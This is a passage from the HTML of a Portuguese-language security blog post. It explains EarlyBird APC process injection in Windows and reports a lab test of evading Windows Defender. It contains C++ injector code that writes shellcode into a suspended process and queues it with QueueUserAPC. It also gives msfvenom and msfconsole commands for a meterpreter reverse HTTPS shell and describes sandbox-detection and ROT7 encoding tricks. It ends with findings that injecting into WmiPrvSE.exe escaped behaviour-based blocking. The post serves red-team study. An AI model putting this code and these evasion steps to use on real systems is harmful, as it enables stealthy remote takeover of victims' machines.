</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">shellcodeRemoteLocation</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Error on VirtualAllocEx: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;   </span><span class="se">\\</span><span class="s">_ [+] Allocated &#34;</span> <span class="o">&lt;&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; bytes at region &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; 0x&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">shellcodeRemoteLocation</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span></code></pre></div><p>A seguir, utilizaremos a fun√ß√£o <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a> para escrevermos o nosso shellcode na localiza√ß√£o previamente alocada pelo <code>VirtualAllocEx</code>. Criaremos uma vari√°vel do tipo SIZE_T para guardarmos a quantidade de bytes escrita pela fun√ß√£o - sem um ponteiro para ela, a fun√ß√£o n√£o ir√° funcionar.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Trying to write shellcode at allocated memory...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">SIZE_T</span> <span class="n">numberOfBytesWritten</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">status</span> <span class="o">=</span> <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">procInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">shellcodeRemoteLocation</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">numberOfBytesWritten</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">status</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Error on WriteProcessMemory: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;   </span><span class="se">\\</span><span class="s">_ [+] Shellcode wrote successfully&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span></code></pre></div><p>Iremos novamente fazer o uso da <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc">QueueUserAPC</a> para enfileirarmos o nosso shellcode remoto na thread principal do processo ainda em suspens√£o.</p>
<p>Para isso, iremos fazer um casting da regi√£o que alocamos no processo v√≠tima para um ponteiro de uma fun√ß√£o APC (<code>PAPCFUNC</code>), a thread principal do programa (obtida por <code>procInfo.hThread</code>) e NULL como √∫ltimo par√¢metro para indicarmos que o shellcode n√£o necessita de argumentos.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Attempting to call shellcode via QueueUserAPC...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">shellcodeRemoteLocation</span><span class="p">,</span> <span class="n">procInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span></code></pre></div><p>Em resumo, teremos uma regi√£o de mem√≥ria RWX alocada em um outro processo, que est√° armazenando um shellcode que foi enfileirado como uma APC da thread principal. Agora o que nos resta √© resumir a thread principal, com <code>ResumeThread</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">procInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;   </span><span class="se">\\</span><span class="s">_ [+] Success&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] EarlyBird injection successful :)&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>O resultado est√° expresso na imagem abaixo.</p>

<img src="img/b490da5b43f58e192d19df97a8f6bded.png"  class="center"  style="border-radius: 1px;"    />


<p>Agora que j√° entendemos o funcionamento das varia√ß√µes, vamos explicar um caso de uso, testado em laborat√≥rio, para bypass do Windows Defender.</p>
<h2 id="evadindo-windows-defender-com-inje√ß√µes-apc">Evadindo Windows Defender com inje√ß√µes APC<a href="#evadindo-windows-defender-com-inje√ß√µes-apc" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Nesta se√ß√£o, iremos tentar realizar o bypass dos m√≥dulos de Real Time Protection e Cloud-delivered Protection do Windows Defender. Para isso, testaremos a efici√™ncia dos c√≥digos de APC Injection, EarlyBird e Shellcode Runner (apenas um <em>wrapper</em> para rodar shellcode em um EXE), quando utilizados para injetar/carregar um payload do meterpreter, com n√≠veis iguais de ofusca√ß√£o e evas√£o de defesas. Os n√≠veis s√£o os seguintes:</p>
<ul>
<li>Detec√ß√£o de ambientes Sandbox para evas√£o de Antiv√≠rus, via <code>GetSystemTime</code> (delay de 10 segundos na execu√ß√£o). Caso uma sandbox seja detectada, o processo dever√° encerrar;</li>
<li>Evas√£o de assinaturas com uso de encoder ROT7 para armazenar o shellcode no injetor. O c√≥digo do ofuscador ROT7 est√° dispon√≠vel no <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/ShellcodeObfuscator">Github</a>, sendo apenas necess√°rio alterar a vari√°vel global &ldquo;shellcode&rdquo; para o shellcode gerado.</li>
</ul>
<p>O Shellcode Runner √© nosso teste de controle, e os demais ser√£o colocados √† prova com rela√ß√£o √† sua efetividade de acordo com a detec√ß√£o/bloqueio recebidas no laborat√≥rio controlado.</p>
<blockquote>
<p>Comando utilizado para gerar shell reversa x64 staged HTTPS do meterpreter:</p>
<ul>
<li><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.2 LPORT=443 EXITFUNC=thread -f c</code></li>
</ul>
<p>Comando para criar um listener no meterpreter:</p>
<ul>
<li><code>msfconsole -x &quot;use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.100.2; set LPORT 443; set EXITFUNC thread; exploit&quot;</code></li>
</ul>
</blockquote>
<h3 id="resultados-shellcode-runner">Resultados Shellcode Runner<a href="#resultados-shellcode-runner" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>O c√≥digo do Shellcode Runner utilizado est√° dispon√≠vel <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/ShellcodeExecutor">nesse link</a>.</p>
<p>Como explicado anteriormente, estamos utilizando o Shellcode Runner apenas como ponto de controle. Caso ele n√£o seja detectado, ent√£o nossos n√≠veis-padr√£o de ofusca√ß√£o e evas√£o possivelmente s√£o os respons√°veis principais por esse resultado, e n√£o as inje√ß√µes APC. Caso contr√°rio, temos uma boa probabilidade de que as t√©cnicas que n√£o foram detectadas obtiveram sucesso por causa da inje√ß√£o realizada.</p>
<p>Tal artefato foi identificado e bloqueado antes mesmo de executar qualquer instru√ß√£o, evidenciando que apenas as evas√µes de assinatura e de sandbox existentes n√£o seriam capazes de evadir o Windows Defender.</p>

<img src="img/1fe26686d7e5d87fdb07420e06a85817.png"  class="center"  style="border-radius: 1px;"    />


<h3 id="resultados-apc-injector">Resultados APC Injector<a href="#resultados-apc-injector" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>O c√≥digo do APC Injector utilizado est√° dispon√≠vel <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/APCInjector">nesse link</a>.</p>
<p>A inje√ß√£o foi realizada no <em>explorer.exe</em>, por√©m, houve bloqueio do Windows Defender pouco ap√≥s o estabelecimento da shell reversa, como destacado na imagem abaixo.</p>

<img src="img/2ec798d5ca8bc8637f19dc256a6184a3.png"  class="center"  style="border-radius: 1px;"    />


<h3 id="resultados-earlybird">Resultados EarlyBird<a href="#resultados-earlybird" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>O c√≥digo do EarlyBird utilizado est√° dispon√≠vel <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/EarlyBird">nesse link</a>.</p>
<p>Devido √† natureza da inje√ß√£o EarlyBird, podemos utiliz√°-la para enfileirar APCs em praticamente qualquer processo que possa ser criado diretamente por nosso usu√°rio. Logo, vamos fazer alguns testes com rela√ß√£o aos processos <em>explorer.exe</em> e <em>svchost.exe</em>.</p>
<p>O motivo para a escolha desses dois arquivos em espec√≠fico √© que o explorer.exe √© um processo muito comum e que existe sempre em qualquer sistema Windows, que pode passar despercebido por softwares Antiv√≠rus. J√° o svchost.exe tamb√©m √© comum e geralmente n√£o gera suspeitas com rela√ß√£o ao tr√°fego de rede.</p>
<p>Na imagem abaixo, podemos evidenciar o resultado do <em>explorer.exe</em>. A inje√ß√£o foi um sucesso. Entretanto, ao tentarmos executar alguns comandos do meterpreter, como o comando <em>shell</em>, que nos d√° controle sobre o cmd.exe do alvo, somos apresentados com bloqueios, com base em comportamento, do Windows Defender, que evita nosso acesso a shell local.</p>

<img src="img/08aae613073683f12e9a22943a203e51.png"  class="center"  style="border-radius: 1px;"    />


<p>Tal comportamento tamb√©m ocorreu no <em>svchost.exe</em>:</p>

<img src="img/569b8cf7f3ef7a7405fb29bd7bdc8cc6.png"  class="center"  style="border-radius: 1px;"    />


<p>Possivelmente o Windows Defender monitora de perto as a√ß√µes que o <em>explorer.exe</em> e <em>svchost.exe</em> realizam no sistema. A cria√ß√£o de um processo-filho do cmd.exe pode ser visto como comportamento suspeito a partir desses processos.</p>
<h4 id="o-caso-wmiprvseexe">O caso WmiPrvSe.exe<a href="#o-caso-wmiprvseexe" class="hanchor" ariaLabel="Anchor">#</a> </h4>
<p>O arquivo <code>C:\Windows\System32\wbem\WmiPrvSE.exe</code> √© um caso especial, visto que ele pode ser utilizado para criar diversos outros processos. Uma reflex√£o surge a partir dessa informa√ß√£o: ser√° que o comando <em>shell</em> do meterpreter seria executado sem bloqueios?</p>
<p>Testando a inje√ß√£o EarlyBird, com o mesmo shellcode utilizado anteriormente, mas agora tendo como alvo o arquivo <code>WmiPrvSE.exe</code>, resultou em estabelecimento com sucesso da comunica√ß√£o reversa, como no caso anterior, por√©m tamb√©m foi poss√≠vel executar o comando <em>shell</em>, sem bloqueios pelo Windows Defender:</p>

<img src="img/1cf41dad10930134b3851e679a28485b.png"  class="center"  style="border-radius: 1px;"    />


<h2 id="conclus√£o">Conclus√£o<a href="#conclus√£o" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>O cen√°rio mais efetivo para evas√£o dos m√≥dulos Real Time Protection e Cloud-delivered Protection do Windows Defender durante os testes realizados foi a inje√ß√£o EarlyBird.</p>
<p>N√£o houve detec√ß√£o do injetor, nem do conte√∫do injetado, apenas bloqueio por comportamento de certas funcionalidades (como o comando shell) do meterpreter quando ele foi injetado no <em>explorer.exe</em> e <em>svchost.exe</em>.</p>
<p>Esse problema foi mitigado ao utilizarmos como alvo o arquivo <code>C:\Windows\System32\wbem\WmiPrvSE.exe</code>.</p>
<p>√â importante ressaltar que √© poss√≠vel gerar um shellcode para o EarlyBird que n√£o √© detectado ao ser injetado no <em>explorer.exe</em> ou <em>svchost.exe</em> - no msfvenom, executando novamente o comando para gerar um shellcode pode ser o suficiente. Muitos shellcodes foram gerados, e alguns deles funcionavam 100% nesses dois arquivos.</p>
<p>Entretanto, durante os testes, o cen√°rio mais est√°vel para inje√ß√£o foi o <code>WmiPrvSE</code>, no qual todas as varia√ß√µes de shellcode testadas resultaram em sucesso e n√£o detec√ß√£o do comando <em>shell</em>.</p>

      </div></div>

  
    
<div class="pagination">
  <div class="pagination__title">
    <span class="pagination__title-h">Ler outras postagens</span>
    <hr />
  </div>
  <div class="pagination__buttons">
    
      <a href="https://blog.midnighthackings.com/posts/crackme-0x00/" class="button inline prev">
        &lt; [<span class="button__text">Crackme 0x00 - BruteVerse: An√°lise est√°tica com radare2</span>]
      </a>
    
    
      ::
    
    
      <a href="https://blog.midnighthackings.com/posts/pentest-0x00/" class="button inline next">
         [<span class="button__text">Pentest 0x00 - Netcat: O canivete su√≠√ßo dos hackers</span>] &gt;
      </a>
    
  </div>
</div>


  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>Midnight Hackings apoia o fim da escala 6x1!</span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
